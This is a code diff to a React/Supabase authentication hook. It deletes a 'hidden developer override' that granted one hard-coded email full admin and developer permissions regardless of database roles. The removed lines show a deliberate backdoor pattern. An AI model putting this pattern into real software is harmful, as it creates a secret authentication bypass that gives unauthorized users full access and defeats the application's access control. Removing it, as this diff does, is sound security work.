@@ -2,7 +2,6 @@ import { useEffect, useState } from "react";
 import type { User } from "@supabase/supabase-js";
 import { supabase } from "@/integrations/supabase/client";
 import { ALL_PERMISSIONS, type PermissionKey } from "@/lib/permissions";
-import { isDeveloperEmail } from "@/lib/license-activation";
 
 export type AppRole = "admin" | "employe" | "developer";
 
@@ -24,16 +23,8 @@ export function useAuth(): AuthState {
   useEffect(() => {
     let active = true;
 
-    async function loadProfile(uid: string, email: string | null) {
-      // Hidden developer override: this exact email always gets full
-      // developer + administrator access, regardless of DB roles.
-      if (isDeveloperEmail(email)) {
-        if (!active) return;
-        setIsDeveloper(true);
-        setRole("admin");
-        setPermissions(ALL_PERMISSIONS);
-        return;
-      }
+    async function loadProfile(uid: string) {
+
 
       const [{ data: roleRows }, { data: emp }] = await Promise.all([
         supabase
@@ -73,14 +64,14 @@ export function useAuth(): AuthState {
     supabase.auth.getUser().then(({ data }) => {
       if (!active) return;
       setUser(data.user ?? null);
-      if (data.user) loadProfile(data.user.id, data.user.email ?? null).finally(() => active && setLoading(false));
+      if (data.user) loadProfile(data.user.id).finally(() => active && setLoading(false));
       else setLoading(false);
     });
 
     const { data: sub } = supabase.auth.onAuthStateChange((_event, session) => {
       if (!active) return;
       setUser(session?.user ?? null);
-      if (session?.user) loadProfile(session.user.id, session.user.email ?? null);
+      if (session?.user) loadProfile(session.user.id);
       else {
         setRole(null);
         setPermissions([]);
